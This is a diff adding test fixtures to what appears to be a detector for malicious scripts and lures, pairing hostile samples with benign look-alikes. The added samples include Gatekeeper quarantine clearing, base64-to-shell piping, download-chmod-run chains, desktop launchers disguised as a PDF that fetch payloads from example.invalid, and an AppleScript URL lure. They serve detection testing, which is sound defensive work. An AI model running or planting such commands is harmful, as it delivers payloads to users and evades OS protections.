@@ -193,7 +193,41 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"xattr -d com.apple.quarantine ./file\n",
             b"The command xattr -d com.apple.quarantine is discussed.\n",
         ),
+        (
+            "script_clear_quarantine",
+            b"sudo xattr -cr /Applications/Installer.app\n",
+            b"xattr -p com.apple.quarantine ./file\n",
+        ),
+        (
+            "script_base64_decode_pipe",
+            b"echo Y3VybA== | base64 -D | zsh\n",
+            b"base64 -d notes.b64 > notes.txt\n",
+        ),
         ("script_chmod_execute", b"chmod +x setup.sh\n./setup.sh\n", b"chmod +x setup.sh\n"),
+        (
+            "script_fetch_chmod_run",
+            b"curl -fsSLo /tmp/u https://example.invalid/u && chmod +x /tmp/u && /tmp/u\n",
+            b"curl -LO https://example.invalid/kubectl && chmod +x kubectl"
+            b" && sudo mv kubectl /usr/local/bin/\n",
+        ),
+        (
+            "linux_desktop_exec_fetch",
+            b"[Desktop Entry]\nType=Application\nName=Notice.pdf\n"
+            b"Exec=sh -c 'wget -q -O /tmp/.x https://example.invalid/x'\n",
+            b"[Desktop Entry]\nType=Application\nName=Firefox\nExec=firefox %u\n",
+        ),
+        (
+            "linux_desktop_exec_fetch",
+            b'[Desktop Entry]\nType=Application\nExec=bash -c "cd /tmp && curl -so p https://example.invalid/p"\n',
+            b"[Desktop Entry]\nType=Application\nName=Docs\nExec=firefox https://curl.se/docs/\n",
+        ),
+        (
+            "web_applescript_url_lure",
+            b'<a href="applescript://com.apple.scripteditor?action=new&amp;'
+            b'script=do%20shell%20script%20%22curl%20-s%20https%3A%2F%2Fexample.invalid%22">x</a>\n',
+            b'<a href="applescript://com.apple.scripteditor?action=new&'
+            b'script=display%20dialog%20%22Hello%22">x</a>\n',
+        ),
         (
             "script_launchagent_shell",
             b"<plist><key>ProgramArguments</key><array><string>/bin/bash</string><string>curl</string></array></plist>",
